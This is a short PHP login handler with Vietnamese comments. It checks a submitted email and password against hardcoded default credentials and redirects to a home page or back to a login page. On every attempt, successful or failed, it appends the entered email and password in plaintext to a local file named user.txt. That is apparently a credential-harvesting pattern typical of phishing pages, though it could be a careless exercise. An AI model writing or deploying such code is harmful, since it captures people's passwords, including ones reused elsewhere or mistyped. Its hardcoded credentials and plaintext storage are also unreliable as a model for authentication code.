<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $defaultEmail = "user@example.com";
    $defaultPassword = "password123";

    $file = 'user.txt';

    if ($email === $defaultEmail && $password === $defaultPassword) {
        // Lưu thông tin đúng vào file
        $content = "SUCCESS LOGIN - Email: $email\nPassword: $password\n\n";
        file_put_contents($file, $content, FILE_APPEND);

        // Chuyển hướng tới HOME.html
        header("Location: ./HOME.html");
        exit();
    } else {
        // Lưu thông tin sai vào file
        $content = "FAILED LOGIN - Email: $email\nPassword: $password\n\n";
        file_put_contents($file, $content, FILE_APPEND);

        // Hiển thị thông báo lỗi và chuyển trở lại DANGNHAP.html
        $error = "Sai email hoặc mật khẩu!";
        header("Location: ./DANGNHAP.html?error=" . urlencode($error));
        exit();
    }
}
